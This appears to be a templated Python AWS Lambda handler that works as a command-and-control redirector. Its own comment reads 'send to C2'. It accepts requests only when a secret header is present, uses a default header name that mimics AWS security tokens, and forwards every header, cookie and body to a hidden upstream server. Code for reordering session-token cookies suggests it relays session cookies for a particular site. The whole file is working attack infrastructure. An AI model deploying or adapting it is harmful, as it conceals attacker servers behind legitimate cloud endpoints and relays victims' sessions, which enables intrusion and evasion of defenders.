#!/usr/bin/env python3
import os
import sys
import base64
import hashlib
import urllib.request
import urllib.error

LINKED_ASSET_URL = "{{ linked_asset_a_record }}"
GUARDRAIL_VALUE = os.environ.get('GUARDRAIL_VALUE', '').strip()
GUARDRAIL_HEADER = os.environ.get('GUARDRAIL_HEADER', '{{ guardrail_header }}').strip() or 'x-amz-security-token'
DEBUG = bool(os.environ.get('DEBUG'))

if not LINKED_ASSET_URL or LINKED_ASSET_URL.startswith('{' + '{'):
    print('ERROR: LINKED_ASSET_URL placeholder was not replaced.')
    sys.exit(2)
if not GUARDRAIL_VALUE:
    print('ERROR: GUARDRAIL_VALUE environment variable is not set.')
    sys.exit(2)

if not LINKED_ASSET_URL.startswith(('http://', 'https://')):
    LINKED_ASSET_URL = 'https://' + LINKED_ASSET_URL


def lambda_handler(event, context):
    # 1. CAPTURE: extract method, path, headers, body
    method = event.get('requestContext', {}).get('http', {}).get('method') or event.get('httpMethod', 'GET')
    path = event.get('rawPath') or event.get('path', '/')
    headers = event.get('headers', {})
    body = event.get('body')
    is_b64 = event.get('isBase64Encoded', False)

    if DEBUG:
        print(f'[DEBUG] Full event: {event}')
        print(f'[DEBUG] {method} {path}')
        if 'Cookie' in headers or 'cookie' in headers:
            cookie_key = 'Cookie' if 'Cookie' in headers else 'cookie'
            print(f'[DEBUG] Original Cookie header: {headers[cookie_key]}')

    # 2. VALIDATE: enforce guardrail
    guardrail = next((v for k, v in headers.items() if k.lower() == GUARDRAIL_HEADER.lower()), None)
    if guardrail != GUARDRAIL_VALUE:
        if DEBUG:
            print(f'[DEBUG] Guardrail check failed: got {guardrail!r}')
        return {'statusCode': 403, 'body': 'Forbidden'}

    if DEBUG:
        print(f'[DEBUG] Guardrail validated')

    # Forward all headers except those we must remove
    # Remove only: AWS infrastructure, guardrail, and Host (which urllib will auto-generate)
    headers_to_remove = {'x-amzn-trace-id', 'x-forwarded-port', 'x-forwarded-proto', 'host', GUARDRAIL_HEADER.lower()}
    forwarded_headers = {k: v for k, v in headers.items() if k.lower() not in headers_to_remove}

    # Fix API Gateway cookie reordering: ensure skin=noskin comes before session-token
    if 'Cookie' in forwarded_headers:
        cookie = forwarded_headers['Cookie']
        if 'session-token=' in cookie and 'skin=noskin' in cookie and not cookie.startswith('skin=noskin'):
            # Cookies are out of order; rebuild as: skin=noskin;session-token=...
            parts = [p.strip() for p in cookie.split(';')]
            skin = [p for p in parts if p.startswith('skin=')]
            rest = [p for p in parts if not p.startswith('skin=')]
            if skin:
                forwarded_headers['Cookie'] = skin[0] + ';' + ';'.join(rest)

    # 3. RECONSTRUCT: build upstream request
    stage = event.get('requestContext', {}).get('stage', 'v2')
    if not path.startswith(f'/{stage}/'):
        if path.startswith('/'):
            path = f'/{stage}' + path
        else:
            path = f'/{stage}/' + path
    url = LINKED_ASSET_URL.rstrip('/') + path
    if event.get('rawQueryString'):
        url += '?' + event['rawQueryString']

    if is_b64 and body:
        data = base64.b64decode(body)
    elif body:
        data = body.encode('utf-8') if isinstance(body, str) else body
    else:
        data = None


    if DEBUG:
        print(f'[DEBUG] Forwarding headers: {forwarded_headers}')
        if 'Cookie' in forwarded_headers:
            print(f'[DEBUG] Forwarded Cookie: {forwarded_headers["Cookie"]}')

    if DEBUG:
        print(f'[DEBUG] Forwarding to {url}')
        print(f'[DEBUG] Request Content-Length: {len(data) if data else 0}')

    # 4. FORWARD: send to C2
    try:
        req = urllib.request.Request(url, data=data, headers=forwarded_headers, method=method)
        resp = urllib.request.urlopen(req, timeout=30)
        status = resp.status
    except urllib.error.HTTPError as e:
        resp = e
        status = e.code
        if DEBUG:
            print(f'[DEBUG] Upstream returned {status}: {resp.url if hasattr(resp, "url") else "N/A"}')
    except urllib.error.URLError:
        if DEBUG:
            print(f'[DEBUG] Network error forwarding request')
        return {'statusCode': 502, 'body': 'Bad Gateway'}

    # 5. PACKAGE: return response
    resp_body = resp.read()
    try:
        body_out = resp_body.decode('utf-8')
        is_b64_out = False
    except:
        body_out = base64.b64encode(resp_body).decode('ascii')
        is_b64_out = True

    if DEBUG:
        print(f'[DEBUG] Response headers: {dict(resp.headers)}')
        print(f'[DEBUG] Response body length: {len(resp_body)}')
        print(f'[DEBUG] Response: {status}, {len(resp_body)} bytes')

    return {
        'statusCode': status,
        'headers': dict(resp.headers),
        'body': body_out,
        'isBase64Encoded': is_b64_out
    }
